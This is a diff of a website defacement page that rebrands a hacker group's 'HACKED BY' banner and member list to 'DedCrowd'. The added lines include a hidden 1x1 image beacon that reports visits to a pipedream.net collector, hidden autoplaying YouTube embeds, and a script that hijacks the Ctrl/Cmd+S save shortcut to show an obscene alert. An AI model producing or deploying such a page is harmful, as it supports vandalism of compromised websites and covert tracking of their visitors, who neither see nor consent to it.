@@ -1,36 +1,31 @@
 
 <html>
 <head>
-	<div style="position: fixed; top: 100px; left: -300px; width: 600px; padding: 10px; font-size: 10px; text-align: center; color: white; font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: Transparent; border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;"><a href="https://www.facebook.com/PureHackers.Sec" style="text-decoration:none;color:white;">NWH WAS HERE </a></div>
+	<div style="position: fixed; top: 100px; left: -300px; width: 600px; padding: 10px; font-size: 10px; text-align: center; color: white; font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: Transparent; border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;"><a href="https://www.facebook.com/PureHackers.Sec" style="text-decoration:none;color:white;">DC WAS HERE </a></div>
 
 <div class="stars">
   <center>
-    <h1><font color=red>HACKED BY </h1>
-    <h1><font color=orange>TEAM<font color=white> NWH<font color=green> SECURITY
-  <style type="text/css">
+    <h1 style="color:green;">HACKED by</h1>
+    <h1 style="color:red;">Ded<span style="color:lightgreen;">Crowd</span> - <span style="color:aqua;">  Online</span></h1>
+    <embed width="0" height="0" src="https://www.youtube.com/v/HyZMgjYKU6Y&autoplay=1">
+    <embed width="0" height="0" src="https://www.youtube.com/v/U0aL4QhcROg&autoplay=1">
+    <embed width="0" height="0" src="https://www.youtube.com/v/cIto6qzW0Mc&autoplay=1">
+  </center>
+</div>
+<img src="https://eokmyp9glaijyew.m.pipedream.net/?Kamyon=Test1" width="1" height="1" style="display:none;">
 
-@import url('https://fonts.googleapis.com/css?family=Lobster&display=swap') repeat scroll 0 0 rgba(0, 0, 0 , 0);
 
+<script>
+document.addEventListener("keydown", function(e) {
+    if (e.keyCode === 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
+        e.preventDefault();
+        alert('🖕');
+    }
+}, false);
+</script>
 
-
-@font-face { font-family: DaysLater; src: url('https://d4rk-vamp1re.github.io/js-host/28DaysLater-MA0x.ttf'); } 
-
- .ict-log{
-
-         font-family: DaysLater;
-
-         text-align: center;
-
-      }
-
-body { background: url("https://media.tumblr.com/c838dd887608a325eaae477ffa4dd2b7/tumblr_myrxsem7AC1s8tqb9o1_500.gif");
-
-        background-position: absolute;
-
-  background-size: cover;
-
- }
-
+<!-- YouTube Şarkı Otomatik Oynatma -->
+<iframe width="0" height="0" src="https://www.youtube.com/embed/apIzTAjUc4g?autoplay=1&mute=1" allow="autoplay"></iframe>
 
 
 .ict-log{
@@ -177,7 +172,7 @@ body { background: url("https://media.tumblr.com/c838dd887608a325eaae477ffa4dd2b
 </div>
 <div class="twinkling">
   <center><br><br><br>
-    <img src="https://i.ibb.co/6J7mc1k/LOGO-copy-png2.png" width="250"/><br>
+    <img src="https://i.ibb.co/9kfFPCyS/test.png" width="250"/><br>
 <div class="container">
       <div class="text"></div>
 <title>H4CK3D BY TEAM KWH SECURITY </title>
@@ -407,18 +402,18 @@ expand();*/
 <font face="Tahoma" size="5" color=red>[<marquee style="width:200px;height:24px;"><font face="Iceland" color=white>Hacked By : <font face="Iceland" color=yellow>Yellow Flag <font color=white>CYBER <font color=green>WARRIORS</font></font></font></marquee>]</font></center></b>
 		</div>
 	<center>
-		<img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExNzVoMHYyazRvMDM4MTE3ZmltZHc3YmhlMmE4YzV5N3JvZXdxMnR2ayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/sFMDqop2ku4M0/giphy.gif" alt="">
+		<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjFjaTJhamVnMnA0eDdkYmpvZ2czZXhwcHZzYzlmYjlnZW93aDdmdCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l3V0yA9zHe5m29sxW/giphy.gif" alt="">
 		</center>
-<h2 style="font-family: Verdana, Arial, Helvetica, sans-serif; font-size : 16px;" align="center"><font style="font-family: Verdana, Arial, Helvetica, sans-serif; color : red; font-size : 16px;" align="center">ICW<font style="font-family: Verdana, Arial, Helvetica, sans-serif; color : white; font-size : 16px;" align="center"><font color =red><font color=red> WAS <font color=red>HERE</font></font></font>  </h2>
+<h2 style="font-family: Verdana, Arial, Helvetica, sans-serif; font-size : 16px;" align="center"><font style="font-family: Verdana, Arial, Helvetica, sans-serif; color : red; font-size : 16px;" align="center">DedCrowdW<font style="font-family: Verdana, Arial, Helvetica, sans-serif; color : white; font-size : 16px;" align="center"><font color =red><font color=red> WAS <font color=red>HERE</font></font></font>  </h2>
  <p class="we-are"><b><font color="cyan">::WE <font color="cyan">ARE::<font color="white"></b></p>
     </font>
     <font face="Play" class="cn">
-    <center  [<font color="cyan">|</font>  <font color="cyan">|</font> lulzgh057_1377<font color="cyan">|</font>Fr34ky_Bl4ckH4t <font color="cyan">|</font> Mr. ÛñKøwñ <font color="cyan">|</font> owas <font color="cyan">|</font> <font color="cyan">| </font color="cyan"> =-</font> D4rk_ur4n!um <font color="cyan">|</font> PH.Winsxs <font color="cyan">|</font> PH.K1LluA <font color="cyan">|</font> XSilver~ <font color="cyan">|</font> Spade <font color="cyan">|</font> sm1l3 <font color="cyan">|</font> S4nj1 ||<br> -= <font color="cyan">|</font> BSHxS34N <font color="cyan">|</font> PH.BL4CK <font color="cyan">|</font> Mafiaboy <font color="cyan">|</font> PH.XDM8 <font color="cyan">|</font> PH.N <font color="cyan">|</font> ph.s1L3ntgh0st <font color="cyan">|</font> xPad3 <font color="cyan">|</font> INTRAVENOUS.PH <font color="cyan">|</font> Satan666 <font color="cyan">|</font><font color="cyan">Imba.PH   <br> || PH.3XTR4CT <font color="cyan">|</font> PH.xR3aper <font color="cyan">|</font> PH.1nDr4 <font color="cyan">|</font> J4ck Skel3t0n <font color="cyan">|</font> NewbieXHacker <font color="cyan">|</font> Mng.Carl<3 <font color="cyan">|</font> ph.MasKARra <font color="cyan">|</font> Mang Kepweng/DarKLorD.PH <font color="red">|</font> DedCrowd] 
+    <center  [<font color="cyan">|</font>  <font color="cyan">|</font> Gyotin<font color="cyan">|</font>DedCrowd <font color="cyan">|</font> M4RK <font color="cyan">|</font> cr0 <font color="cyan">|</font> <font color="cyan">| </font color="cyan"> =-</font> D4rk_ur4n!um <font color="cyan">|</font> PH.Winsxs <font color="cyan">|</font> PH.K1LluA <font color="cyan">|</font> XSilver~ <font color="cyan">|</font> Spade <font color="cyan">|</font> sm1l3 <font color="cyan">|</font> S4nj1 ||<br> -= <font color="cyan">|</font> BSHxS34N <font color="cyan">|</font> PH.BL4CK <font color="cyan">|</font> Mafiaboy <font color="cyan">|</font> PH.XDM8 <font color="cyan">|</font> PH.N <font color="cyan">|</font> ph.s1L3ntgh0st <font color="cyan">|</font> xPad3 <font color="cyan">|</font> INTRAVENOUS.PH <font color="cyan">|</font> Satan666 <font color="cyan">|</font><font color="cyan">Imba.PH   <br> || PH.3XTR4CT <font color="cyan">|</font> PH.xR3aper <font color="cyan">|</font> PH.1nDr4 <font color="cyan">|</font> J4ck Skel3t0n <font color="cyan">|</font> NewbieXHacker <font color="cyan">|</font> Mng.Carl<3 <font color="cyan">|</font> ph.MasKARra <font color="cyan">|</font> Mang Kepweng/DarKLorD.PH <font color="red">|</font> DedCrowd] 
     </font>
   </center>
     </div>
 	<br/><br/>
-<marquee><i><center><p>Proudly Say's hacked By Hacker</p></center></i>
+<marquee><i><center><p>Proudly Say's hacked By DedCrowd</p></center></i>
 
   </body>
 </html>
